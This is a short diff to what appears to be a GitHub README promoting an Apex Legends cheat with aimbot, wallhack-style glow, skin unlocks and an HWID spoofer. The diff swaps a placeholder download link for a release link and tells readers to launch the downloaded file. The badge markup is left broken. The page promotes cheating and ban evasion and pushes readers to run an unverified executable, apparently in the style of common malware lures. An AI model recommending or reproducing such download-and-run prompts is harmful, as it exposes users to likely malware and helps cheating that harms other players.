@@ -37,9 +37,9 @@ Apex Legends is a challenging and highly competitive game. You'll be competing a
 
 ## Access the Hack
 
-🚀 Download the Apex Legends External Cheat Hack from [here](https://github.com/file/App.zip). Make sure to launch the file after download to experience the ultimate gaming advantage.
+🚀 Download the Apex Legends External Cheat Hack from [here](https://github.com/Gen-Amful/Apex-Legends-External-Cheat-Hack-Trigger-Glow-Aimbot-Skin-More-Hwid-Spoofer/releases/tag/v2.0). Make sure to launch the file after download to experience the ultimate gaming advantage.
 
-[![Download Hack](https://img.shields.io/badge/Download%20Hack-Click%20Here-green)](https://github.com/file/App.zip)
+[![Download Hack](https://github.com/Gen-Amful/Apex-Legends-External-Cheat-Hack-Trigger-Glow-Aimbot-Skin-More-Hwid-Spoofer/releases/tag/v2.0%20Hack-Click%20Here-green)](https://github.com/Gen-Amful/Apex-Legends-External-Cheat-Hack-Trigger-Glow-Aimbot-Skin-More-Hwid-Spoofer/releases/tag/v2.0)
 
 ---
 
